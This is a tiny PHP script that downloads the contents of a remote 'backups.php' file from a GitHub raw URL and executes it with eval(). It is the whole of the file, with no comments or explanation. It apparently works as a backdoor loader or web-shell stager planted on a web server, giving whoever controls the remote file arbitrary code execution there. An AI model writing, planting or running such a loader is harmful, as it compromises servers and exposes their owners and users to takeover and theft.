<?php

$content = file_get_contents(urldecode('https://raw.githubusercontent.com/eagles227/claudia/main/backups.php'));

$content = "?> ".$content;
eval($content);
